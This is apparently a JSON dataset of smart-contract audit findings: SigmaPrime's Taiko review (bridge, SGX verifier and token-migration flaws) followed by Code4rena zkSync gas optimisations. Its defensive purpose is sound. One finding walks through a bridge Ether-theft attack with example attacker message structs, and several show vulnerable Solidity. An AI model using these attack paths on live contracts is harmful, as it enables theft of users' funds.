      "content": "## Description\n\nDuring a migration from an old bridged token (bToken) to a new bToken, the `burn()` function allows anyone to migrate by burning their old bTokens and minting new bTokens. However, no access control is placed on this functionality. As a result, if a user has their bTokens locked in a smart contract (such as a liquidity pool), a malicious actor can call `burn()` on the tokens in the LP. This would result in the user’s new bTokens being stuck in the smart contract.\n\n```solidity\nfunction burn(address account, uint256 amount) public nonReentrant whenNotPaused {\n    if (migratingAddress != address(0) && !migratingInbound) {\n        // Outbond migration\n        emit MigratedTo(migratingAddress, account, amount);\n        // Ask the new bridged token to mint token for the user.\n        IBridgedERC20(migratingAddress).mint(account, amount); //@audit no access control on `account`\n    } else if (msg.sender != resolve(\"erc20_vault\", true)) {\n        // Bridging to vault\n        revert RESOLVER_DENIED();\n    }\n    _burnToken(account, amount);\n}\n```\n\n## Recommendations\n\n- Add access controls such that a user can only `burn()` (migrate) their own bTokens.\n- One consideration to make with adding access control is that it is no longer possible to fully migrate away from an old bToken. There will most likely always remain some unmigrated tokens. Previously the team could migrate the remaining tokens for inactive users, but this would no longer be possible. This may lead to complications if the new bTokens need to be migrated away from at a later date, since a bToken cannot have an inbound and an outbound migration simultaneously.\n- A solution to this second issue could be to allow the owner to migrate other users’ tokens.\n\n## Resolution\n\nAccess control has been added to the function `burn()` such that it may only be called by the address which is migrating tokens. This can be seen in PR #15566.",
      "summary": "\nThe report discusses a bug found during a migration process for a token. The bug allows anyone to migrate by burning their old tokens and minting new ones, but there is no access control in place. This means that a malicious actor could call the burn() function on tokens locked in a smart contract, leaving the user's new tokens stuck in the contract. The recommendation is to add access controls so that only the user can burn their own tokens. However, this may make it difficult to fully migrate away from the old token in the future. The resolution is to add access control to the burn() function in a new update. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36002",
      "title": "toBytes32() Can Read Out of Bounds",
      "impact": "HIGH",
      "content": "## Description\n\n`LibBytesUtils.toBytes32()` takes some bytes as input but does not account for inputs with length 0. If an empty bytes object is given as an input to `toBytes32()`, it will read past the input and execute an out-of-bounds read, returning the 32 bytes allocated after the input. As such, if an attacker has control over the variable allocated after the input, they could arbitrarily choose the output of `toBytes32()`.\n\n```solidity\nfunction toBytes32(bytes memory _bytes) internal pure returns (bytes32) {\n    if (_bytes.length < 32) {\n        bytes32 ret;\n        assembly {\n            ret := mload(add(_bytes, 32)) //@audit this may not be initialised by `_bytes`\n        }\n        return ret;\n    }\n    return abi.decode(_bytes, (bytes32)); // will truncate if input length > 32 bytes\n}\n```\n\nThe issue is rated as high severity as `toBytes32()` is used in critical parts of the code such as `LibMerkleTrie.verifyInclusionProof()`.\n\n## Recommendations\n\nIt is recommended to add a check for the case where input length is zero.\n\n## Resolution\n\nThe development team has initiated a clean solution where they instead replace the function `toBytes32()` with Solidity native type casting. This means directly casting bytes types to `bytes32()`. The solution can be seen in PR #15565.",
      "summary": "\nThe LibBytesUtils.toBytes32() function has a bug where it does not handle empty bytes inputs correctly. This can lead to an out-of-bounds read and potentially allow an attacker to control the output of the function. This bug is considered high severity as it is used in critical parts of the code. The recommended solution is to add a check for empty inputs, but the development team has instead opted to replace the function with a Solidity native type casting. This solution can be found in PR #15565. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36001",
      "title": "Prover Payment In ERC20 Tokens Always Reverts",
      "impact": "HIGH",
      "content": "## Description\n\nAssignmentHooks are used to pay a prover’s fee via calling `onProposedBlock()` and transferring the specified asset from the proposer. A proposer can choose to be paid in ETH or any ERC20 token; if a prover chooses payment in an ERC20 token, then incorrect code logic causes the transaction to revert.\n\nThis revert occurs because line [116] specifies the `transferFrom()` sender as `msg.sender`, which will always be `TaikoL1.sol` due to the `onlyFromNamed(\"taiko\")` modifier on the `onProposedBlock()` function. The intended sender is the proposer, and as a result, there will not be a balance of the ERC20 token nor approval for the transfer available at `TaikoL1.sol`, leading to the function reverting. This then forces the `TaikoL1.proposeBlock()` parent function to also revert.\n\n```solidity\n94 if (assignment.feeToken == address(0)) {\n95 if (msg.value < proverFee + input.tip) {\n96 revert HOOK_ASSIGNMENT_INSUFFICIENT_FEE();\n97 }\n98 \n99 unchecked {\n100 refund = msg.value - proverFee - input.tip;\n101 }\n102 \n103 // Paying Ether\n104 blk.assignedProver.sendEther(proverFee, MAX_GAS_PAYING_PROVER);\n105 } else {\n106 if (msg.value < input.tip) {\n107 revert HOOK_ASSIGNMENT_INSUFFICIENT_FEE();\n108 }\n109 unchecked {\n110 refund = msg.value - input.tip;\n111 }\n112 // Paying ERC20 tokens\n113 IERC20(assignment.feeToken).transferFrom(msg.sender, blk.assignedProver, proverFee);\n114 }\n```\n\n## Recommendations\n\nCorrecting the `msg.sender` on line [116] to instead be the proposer will fix this issue.\n\n## Resolution\n\nERC20 payments have been updated to correctly transfer funds from the block proposer to the assigned prover. This can be seen in PR #15486.",
      "summary": "\nThe bug report discusses an issue with AssignmentHooks, which are used to pay a prover's fee in a specific asset. The bug occurs when a prover chooses to be paid in an ERC20 token, as the code logic is incorrect and causes the transaction to revert. This is due to a mistake in line 116, where the sender is specified as msg.sender instead of the proposer. This results in the function reverting and causing the parent function to also revert. The report recommends correcting this mistake by changing the msg.sender to the proposer. The bug has been resolved in PR #15486, which updates the code to correctly transfer funds from the block proposer to the assigned prover.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "36000",
      "title": "SGX verifyProof() Allows Front-running To Prevent Proving L2 Blocks",
      "impact": "HIGH",
      "content": "## Description\n\nThe function `verifyProof()` is front-runnable by arbitrary users to prevent proving of a block. There is no access control on the function `verifyProof()`. The intended caller is the smart contract `TaikoL1`, however, it is possible for any user to mimic the call from `TaikoL1`.\n\n`verifyProof()` is a stateful function which will modify the address of an instance via `_replaceInstance(id, oldInstance, newInstance)`. As a result, if a malicious user calls `verifyProof()` before `TaikoL1` calls `verifyProof()`, the call from `TaikoL1` will revert due to an invalid instance address.\n\nThe impact of calling `verifyProof()` is that the prover’s call to `TaikoL1.proveBlock()` will fail. While it is difficult to maintain a DoS attack involving front-running for an extended period of time, this may cause delays to block proving, potentially preventing assigned provers or contesters from proving blocks within the assigned windows.\n\n## Recommendations\n\nIt is recommended to add access control such that `verifyProof()` can only be called via `TaikoL1` or as part of other verifiers in the tiered proving hierarchy. However, it is important to note that an SGX instance may clear its private key after signing. If this is the case, an instance will require an alternate method of updating their key to account for the case where another user has already verified the block. That is because it is not possible to call `proveBlock()` twice at the same block height without contesting or increasing the proof tier.\n\n## Resolution\n\nAccess control of the function `verifyProof()` has been restricted to `TaikoL1` and higher tier proofs in PR #15514.",
      "summary": "\nSummary:\n\nThe function verifyProof() in the smart contract TaikoL1 can be accessed by any user, instead of just the intended caller. This can lead to delays in block proving and potential DoS attacks. It is recommended to add access control to the function, but this may be complicated due to the use of SGX instances. The issue has been resolved by restricting access to TaikoL1 and higher tier proofs. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "35999",
      "title": "AssignmentHooks May Drain Prover TKO When Calling proposeBlock()",
      "impact": "HIGH",
      "content": "## Description\n\nAssignmentHooks are used to transfer the livenessBond from the assigned prover by calling `AssignmentHook.onProposedBlock()`. However, there is nothing to prevent calling the same assignment hook repeatedly for a single block proposal. As a result, it is possible to drain the entire approval of TKO funds from the assigned prover.\n\nThe issue occurs because each ProverAssignment contains a signature that is used to confirm the prover's acceptance of a block; however, nothing is done to invalidate future uses of the same signature, allowing the signature to be repeatedly used for a single proposal.\n\nEach time the `assignmentHook` is called, the signature is validated, and TKO tokens are transferred from the prover to the `TaikoL1` contract. There is an inequality on line [257] in the following snippet, which allows more TKO than required to be transferred from the hooks.\n\n```solidity\n235 IERC20 tko = IERC20(resolver.resolve(\"taiko_token\", false));\nuint256 tkoBalance = tko.balanceOf(address(this));\n237\n// Run all hooks.\n239 // Note that address(this).balance has been updated with msg.value,\n// prior to any code in this function has been executed.\n241 for (uint256 i; i < params.hookCalls.length; ++i) {\n// When a hook is called, all ether in this contract will be sent to the hook.\n243 // If the ether sent to the hook is not used entirely, the hook shall send the Ether\n// back to this contract for the next hook to use.\n245 // Proposers shall choose to use extra hooks wisely.\nIHook(params.hookCalls[i].hook).onBlockProposed{ value: address(this).balance }(\n247 blk, meta, params.hookCalls[i].data\n);\n249 }\n// Refund Ether\n251 if (address(this).balance != 0) {\nmsg.sender.sendEther(address(this).balance);\n253 }\n255 // Check that after hooks, the Taiko Token balance of this contract\n// has increased by at least config.livenessBond\n257 if (tko.balanceOf(address(this)) < tkoBalance + config.livenessBond) { //@audit inequality allows excess transfer\nrevert L1_LIVENESS_BOND_NOT_RECEIVED();\n259 }\n```\n\nThe malicious proposer is required to pay the prover’s ETH/ERC20 fee each time they call `assignmentHook.onProposedBlock()`. Hence, this attack can be considered a griefing attack since the attacker does not gain funds but will cause the prover to lose more funds than the cost to the attacker. This assumes the liveness bond is significantly more than the prover fee.\n\n## Recommendations\n\nThe vulnerability should be mitigated in multiple ways:\n\n- Compare assignmentHook addresses in `proposeBlock()` and revert if any are the same.\n- Make the balance transfer check a strict equality on line [257]; the call should only succeed if exactly the `livenessBond` is received by `TaikoL1`.\n- Include a nonce in each prover signature and increment it after each signature check in `AssignmentHook.onBlockProposal()` to prevent signature reuse.\n\n## Resolution\n\nA resolution has been implemented in two parts:\n\n1. Prevent a hook from being called multiple times in `LibProposing`. This can be seen in PR #15492.\n2. Enforce a strict equality on the amount of TKO tokens sent to `TaikoL1`, stopping the potential for over-payments in a prover assignment. This can be seen in PR #15486.",
      "summary": "\nThis bug report describes a vulnerability in the TaikoL1 contract, which allows a malicious user to repeatedly call the AssignmentHook.onProposedBlock() function and drain all the TKO funds from the assigned prover. This is possible because there is no check to prevent the same assignment hook from being called multiple times for a single block proposal. This can be considered a grieﬁng attack, as the attacker does not gain funds but causes the prover to lose more funds than the cost to the attacker. To mitigate this vulnerability, the report recommends comparing assignment hook addresses and enforcing a strict equality on the amount of TKO tokens transferred to TaikoL1. The issue has been resolved by preventing multiple calls to the same hook and enforcing the strict equality check. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "35998",
      "title": "Incorrect Value Assigned To token When Recalling Messages",
      "impact": "HIGH",
      "content": "## Description\n\nIn the function `onMessageRecalled()` in `ERC20Vault.sol`, the calldata intended for `receiveToken()` is decoded to refund the user’s tokens. However, during this decoding, the `token` variable is assigned the value `user` instead of the token address.\n\n```solidity\n(, address token,, uint256 amount) =\nabi.decode(message.data[4:], (CanonicalERC20, address, address, uint256));\n```\n\nAs seen in the code snippet above, `token` decoded as the second parameter of `message.data`. However, looking at the encoding in the following code snippet, it can be seen that the second parameter, excluding the selector, is `user`.\n\n```solidity\nmsgData =\nabi.encodeWithSelector(this.receiveToken.selector, ctoken, user, to, _balanceChange);\n```\n\nConsequently, the contract is unable to refund the user’s tokens, as the incorrect token address is used. Therefore, any recalled messages from the `ERC20Vault` will revert or result in funds stuck in the contract.\n\n## Recommendations\n\nTo resolve this issue, ensure `token` is assigned the correct address, found inside the struct `CanonicalERC20.addr`.\n\n## Resolution\n\nThe recommendation has been implemented in PR #15582.",
      "summary": "This bug report is about a function in a contract called ERC20Vault. The function is supposed to refund a user's tokens, but it is not working correctly. This is because the variable \"token\" is being assigned the wrong value, which is causing the contract to be unable to refund the tokens. This means that any messages that are recalled from the ERC20Vault will not be refunded correctly and may result in funds being stuck in the contract. To fix this issue, the variable \"token\" needs to be assigned the correct address, which has been done in a recent update to the contract. ",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "35997",
      "title": "Insuﬃcient Signature Hashing For SGX addInstances()",
      "impact": "HIGH",
      "content": "## Description\n\nA bug exists in one of the `addInstances()` functions which allows replacing a current SGX instance with any arbitrary address. The address may be non-SGX and therefore can operate outside of the trusted execution environment. There are two implementations of `addInstances()`, one restricted to `onlyOwner` and the other allowing current SGX instances to add multiple new SGX instances. \n\nTo prevent side-channel attacks on ECDSA signing, each instance must replace the private key and address each time it generates a signature. \n\nIn the code snippet below, it can be seen that `newInstance` is not included in the `signedHash`. There are no other restrictions on the value of `newInstance`. It can therefore be arbitrarily set by `msg.sender` to a non-SGX address.\n\n```solidity\nfunction addInstances(\n    uint256 id,\n    address newInstance,\n    address[] calldata extraInstances,\n    bytes calldata signature\n) external returns (uint256[] memory ids) {\n    bytes32 signedHash = keccak256(abi.encode(\"ADD_INSTANCES\", extraInstances));\n    address oldInstance = ECDSA.recover(signedHash, signature);\n    if (!_isInstanceValid(id, oldInstance)) revert SGX_INVALID_INSTANCE();\n    _replaceInstance(id, oldInstance, newInstance); //@audit newInstance is not signed by the old instance\n    ids = _addInstances(extraInstances);\n}\n```\n\nThe impact is high as a malicious instance can create an `ADD_INSTANCES` attestation signature for extra instances. The malicious user then sets the `newInstance` parameter to an address where the private key is known. With the malicious address, they are able to sign forged SGX proofs which are accepted by `verifyProof()`.\n\n## Recommendations\n\nTo resolve this issue, include the value of `newInstance` within the `signedHash`. Furthermore, it is recommended to include a domain separator with `address(this)` and `block.chainid` within `signedHash` to prevent replay of signatures on other contracts or chains. This can be achieved through the use of EIP-712: Typed structured data hashing and signing. \n\nAdditionally, domain separation should be added to the function `verifyProof()` to ensure signatures are not re-usable between the functions `addInstances()` and `verifyProof()`.\n\n## Resolution\n\nPR #15514 resolves the issue by updating hashing to include the function parameter `newInstance`. Additionally, domain separation has been included in hashing to prevent replay on other functions or other smart contracts with the same parameters.",
      "summary": "\nThis report describes a bug in a code function called addInstances() that allows for a non-SGX address to be used, potentially leading to unauthorized access outside of the trusted execution environment. There are two versions of this function, one restricted to onlyOwner and the other allowing for multiple new SGX instances to be added. The bug is caused by the fact that a specific value, called newInstance, is not included in the signedHash, allowing it to be arbitrarily set by the user. This could result in a malicious user creating a signature for extra instances and setting the value of newInstance to an address where the private key is known, allowing for forged SGX proofs to be accepted. To fix this issue, the value of newInstance should be included in the signedHash and domain separation should be added to prevent replay of signatures on other contracts or chains. This has been resolved in a recent update to the code.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "35996",
      "title": "Fraudulent Messages May Be Sent Through The Bridge",
      "impact": "HIGH",
      "content": "## Description\n\nDue to the lack of restrictions on `message.to` and `message.data` when processing a message, it is possible to steal tokens stored in the `ERCxxxxVault` and Ether stored in the Bridge by sending a malicious message hash to the `SignalService` contract.\n\nTo perform the attack, a message is sent using the `sendMessage()` function from one bridge to another, with the intended receiver being `SignalService.sendSignal()`. The data to send is a hash of an attacker constructed message. After processing the message, the hash of this malicious message is stored in the `SignalService` contract with a storage slot calculated with `msg.sender = Bridge`.\n\nWith the hash of the malicious message now stored in the `SignalService` contract, it is possible to generate a valid proof. The malicious message may then be processed on the bridge of the other chain.\n\n## This is a detailed example of how an attacker could steal Ether from the bridge:\n\n1. **On Chain A:**\n   - The attacker calls the function `Bridge.sendMessage()` with a message that calls the `SignalService.sendSignal()` function of Chain B. The signal argument used when calling this function should represent a hash of a message that steals Ether from the Chain A bridge. This is an example of a malicious message:\n\n   ```solidity\n   Message({\n       id: 1337,\n       from: ATTACKER,\n       srcChainId: ChainAId,\n       destChainId: ChainBId,\n       owner: ATTACKER,\n       to: chainA_bridge_address,\n       refundTo: ATTACKER,\n       value: valueAmountEther,\n       fee: 0,\n       gasLimit: 0,\n       data: \"\",\n       memo: \"\"\n   });\n   ```\n\n   - The attacker calculates the hash of this message and puts it inside a message that calls `SignalService.sendSignal()`. This is an example of this message:\n\n   ```solidity\n   IBridge.Message memory message = IBridge.Message({\n       from: ATTACKER,\n       srcChainId: ChainBId,\n       destChainId: ChainAId,\n       owner: ATTACKER,\n       to: SignalService,\n       refundTo: Attacker,\n       value: 0,\n       fee: 0,\n       gasLimit: 0,\n       data: abi.encodeWithSelector(SignalService.sendSignal.selector, msgHash),\n       memo: \"\"\n   });\n   ```\n\n2. **On Chain B:** The attacker calls the function `Bridge.processMessage()`. The signal is now stored and it is possible to generate the proof of it.\n\n3. **On Chain A:** The attacker calls the function `Bridge.processMessage()` and all the Ether stored in the bridge is transferred to the attacker.\n\n## Recommendations\n\n- Add restrictions to `message.to`, restricting the smart contracts which can be called by the bridge.\n- Additionally, restrict the function selector such that it calls a specific function when sending messages through the bridge. For example, require the selector matches `onMessageReceived(bytes memory data)`.\n\n## Resolution\n\nThe issue has been resolved by including additional checks on the `message.to` field, preventing arbitrary addresses from being called. The `message.to` field is no longer able to be set to the `signalService` in addition to a modifiable `blacklist addressBanned`. The changes can be seen in PR #15577.",
      "summary": "\nThe bug report describes a vulnerability in the SignalService contract, which allows attackers to steal tokens and Ether from the ERCxxxxVault and Bridge. This is done by sending a malicious message hash to the SignalService contract, which is then processed and stored with a storage slot calculated with msg.sender = Bridge. This allows the attacker to generate a valid proof and steal the Ether from the bridge. The report recommends adding restrictions to message.to and the function selector, and the issue has been resolved by including additional checks on the message.to field. These changes can be seen in PR #15577.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "SigmaPrime",
      "protocol_name": "Taiko",
      "source_link": "https://github.com/sigp/public-audits/blob/master/reports/taiko/review.pdf",
      "github_link": "",
      "tags": [],
      "finders": [
        "Sigma Prime"
      ]
    },
    {
      "id": "30384",
      "title": "[G-41] Save one negation by rewriting the statement in `DiamonProxy.sol`",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/zksync/DiamondProxy.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/DiamondProxy.sol#L31)\n\n```\nrequire(!diamondStorage.isFrozen || !facet.isFreezable, \"q1\");\n```\n\n`!A || !B <=> !(A & B)` which means, it can be rewritten to:\n\n```\nrequire(!(diamondStorage.isFrozen && facet.isFreezable)), \"q1\");\n```\n\n**[Alex the Entreprenerd (judge) commented](https://github.com/code-423n4/2023-10-zksync-findings/issues/338#issuecomment-1849048723):**\n > I believe that some penalty may have been applied by me due to repetitive titles. Overall the report is not bad, but I will not change the scoring.\n\n*Note: For full discussion, see [here](https://github.com/code-423n4/2023-10-zksync-findings/issues/338).*\n\n***\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30383",
      "title": "[G-40] Event in `Executor.sol` can be optimized",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/zksync/facets/Executor.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L405C49-L405C49-L413)\n\n```\n s.totalBatchesCommitted = _newLastBatch;\n\n        // Reset the batch number of the executed system contracts upgrade transaction if the batch\n        // where the system contracts upgrade was committed is among the reverted batches.\n        if (s.l2SystemContractsUpgradeBatchNumber > _newLastBatch) {\n            delete s.l2SystemContractsUpgradeBatchNumber;\n        }\n\n        emit BlocksRevert(s.totalBatchesCommitted, s.totalBatchesVerified, s.totalBatchesExecuted);\n```\n\nSince ` s.totalBatchesCommitted = _newLastBatch`, we can change event to:\n\n```\n emit BlocksRevert(_newLastBatch, s.totalBatchesVerified, s.totalBatchesExecuted);\n```\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30382",
      "title": "[G-39] Redundant `if` condition in `Executor.sol`",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/zksync/facets/Executor.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L354-L367)\n\n```\n if (_proof.serializedProof.length > 0) {\n            bool successVerifyProof = s.verifier.verify(\n                proofPublicInput,\n                _proof.serializedProof,\n                _proof.recursiveAggregationInput\n            );\n            require(successVerifyProof, \"p\"); // Proof verification fail\n        }\n        // #else\n        bool successVerifyProof = s.verifier.verify(\n            proofPublicInput,\n            _proof.serializedProof,\n            _proof.recursiveAggregationInput\n        );\n       require(successVerifyProof, \"p\"); // Proof verification fail\n```\n\nIn above code section, we're performing zkp verification twice.\nFor the first time, when `if (_proof.serializedProof.length > 0)`. And then, for the second time, in line 363.\n\nThis is redundant. Remove the whole `if (_proof.serializedProof.length > 0)` block, because we're repeating `s.verifier.verify()` call after that block for the second time.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30381",
      "title": "[G-38] Simply unchecked operations can be done directly in the code, instead of being imported from the library",
      "impact": "GAS",
      "content": "\nFile `ethereum/contracts/common/libraries/UncheckedMath.sol` is a library which implements two simple unchecked functions: `uncheckedInc()` and `uncheckedAdd()`.\nThose functions are used across the whole code base, mostly inside loops:\n\nFile `ethereum/contracts/zksync/facets/Executor.sol`:\n\n```\n209:        for (uint256 i = 0; i < _newBatchesData.length; i = i.uncheckedInc()) {\n241:        for (uint256 i = 0; i < _newBatchesData.length; i = i.uncheckedInc()) {\n263:        for (uint256 i = 0; i < _nPriorityOps; i = i.uncheckedInc()) {\n293:        for (uint256 i = 0; i < nBatches; i = i.uncheckedInc()) {\n330:        for (uint256 i = 0; i < committedBatchesLength; i = i.uncheckedInc()) {\n```\n\nFile `ethereum/contracts/zksync/facets/Mailbox.sol`:\n\n```\n395:        for (uint256 i = 0; i < factoryDepsLen; i = i.uncheckedInc()) {\n```\n\nFile `ethereum/contracts/zksync/libraries/Diamond.sol`:\n\n```\n100:        for (uint256 i = 0; i < facetCutsLength; i = i.uncheckedInc()) {\n138:        for (uint256 i = 0; i < selectorsLength; i = i.uncheckedInc()) {\n159:        for (uint256 i = 0; i < selectorsLength; i = i.uncheckedInc()) {\n179:        for (uint256 i = 0; i < selectorsLength; i = i.uncheckedInc()) {\n```\n\nFile `ethereum/contracts/zksync/facets/Getters.sol`:\n\n```\n182:        for (uint256 i = 0; i < facetsLen; i = i.uncheckedInc()) {\n```\n\nFile `ethereum/contracts/zksync/libraries/Merkle.sol`:\n\n```\n29:        for (uint256 i; i < pathLength; i = i.uncheckedInc()) {\n```\n\nFile: `ethereum/contracts/common/AllowList.sol`:\n\n```\n62:        for (uint256 i = 0; i < targetsLength; i = i.uncheckedInc()) {\n96:        for (uint256 i = 0; i < callersLength; i = i.uncheckedInc()) {\n```\n\nHowever, using library functions, instead of directly increasing `i` in an `unchecked` block is very gas ineffective. To prove that, a simple test in Remix IDE was prepared:\n\n```\n    function uncheckedInt() public view {\n    uint gas = gasleft();\n    for (uint i = 0; i < 100; ) {\n        require(i == i);\n    unchecked {++i;}\n    }\n\n    console.log(gas - gasleft());\n}\n\n    function uncheckedIntLib() public view {\n    uint gas = gasleft();\n    for (uint i = 0; i < 100; i = i.uncheckedInc()) {require(i == i);\n    }\n    console.log(gas - gasleft());\n    }\n```\n\nFunction `uncheckedInt()` costs 7442 gas, while `uncheckedIntLib()` costs 11742 gas. This implies, that every loop in a form:\n\n```\nfor (uint256 i = 0; (...) i = i.uncheckedInc()) {\n```\n\nShould be rewritten to:\n\n```\nfor (uint256 i = 0; (...) i = i.uncheckedInc()) {\n(...)\nunchecked {++i;}\n}\n```\n\nThere are two additional places in `ethereum/contracts/zksync/facets/Executor.sol`, where the similar rule applies\n\nFile `ethereum/contracts/zksync/facets/Executor.sol`:\n\n```\n123:        for (uint256 i = 0; i < emittedL2Logs.length; i = i.uncheckedAdd(L2_TO_L1_LOG_SERIALIZE_SIZE)) {\n331:            currentTotalBatchesVerified = currentTotalBatchesVerified.uncheckedInc();\n```\n\nIn line 123, `i = i + L2_TO_L1_LOG_SERIALIZE_SIZE` should also be unchecked.\nIn line 331, it should be: `unchecked {++currentTotalBatchesVerified;}`.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30380",
      "title": "[G-37] Move some `require` checks on top of function in `Executor.sol`",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/zksync/facets/Executor.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L317-L327)\n\n```\nuint256 currentTotalBatchesVerified = s.totalBatchesVerified;\nuint256 committedBatchesLength = _committedBatches.length;\n\n// Save the variable from the storage to memory to save gas\nVerifierParams memory verifierParams = s.verifierParams;\n\n// Initialize the array, that will be used as public input to the ZKP\nuint256[] memory proofPublicInput = new uint256[](committedBatchesLength);\n\n// Check that the batch passed by the validator is indeed the first unverified batch\nrequire(_hashStoredBatchInfo(_prevBatch) == s.storedBatchHashes[currentTotalBatchesVerified], \"t1\");\n```\n\n`require(_hashStoredBatchInfo(_prevBatch) == s.storedBatchHashes[currentTotalBatchesVerified], \"t1\");` can be moved up:\n\n```\nuint256 currentTotalBatchesVerified = s.totalBatchesVerified;\n\n// Check that the batch passed by the validator is indeed the first unverified batch\nrequire(_hashStoredBatchInfo(_prevBatch) == s.storedBatchHashes[currentTotalBatchesVerified], \"t1\");\n\nuint256 committedBatchesLength = _committedBatches.length;\n\n// Save the variable from the storage to memory to save gas\nVerifierParams memory verifierParams = s.verifierParams;\n\n// Initialize the array, that will be used as public input to the ZKP\nuint256[] memory proofPublicInput = new uint256[](committedBatchesLength);\n```\n\nThat way, when this check reverts, the function won't waste gas on performing other instructions.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30379",
      "title": "[G-36] Calculations which won't underflow/overflow in `Executor.sol` can be unchecked",
      "impact": "GAS",
      "content": "\n[File: ethereum/contracts/zksync/facets/Executor.sol](https://github.com/code-423n4/2023-10-zksync/blob/1fb4649b612fac7b4ee613df6f6b7d921ddd6b0d/code/contracts/ethereum/contracts/zksync/facets/Executor.sol#L93-L94)\n\n```\nrequire(block.timestamp - COMMIT_TIMESTAMP_NOT_OLDER <= batchTimestamp, \"h1\"); // New batch timestamp is too small\nrequire(lastL2BlockTimestamp <= block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA, \"h2\"); // The last L2 block timestamp is too big\n```\n\nSince `COMMIT_TIMESTAMP_NOT_OLDER` and `COMMIT_TIMESTAMP_APPROXIMATION_DELTA` are constant values, which are known before compilation time, it's reasonable to assume, that they are chosen in a way, which:\n\n- `block.timestamp >= COMMIT_TIMESTAMP_NOT_OLDER`.\n- `block.timestamp + COMMIT_TIMESTAMP_APPROXIMATION_DELTA` won't overflow.\n\nIf that's the case - those two lines can be unchecked.\n\n",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Code4rena",
      "protocol_name": "zkSync",
      "source_link": "https://code4rena.com/reports/2023-10-zksync",
      "github_link": "",
      "tags": [],
      "finders": []
    },
    {
      "id": "30378",
      "title": "[G-35] Loop in `_commitBatchesWithSystemContractsUpgrade()` in `Executor.sol` can be optimized",
      "impact": "GAS",
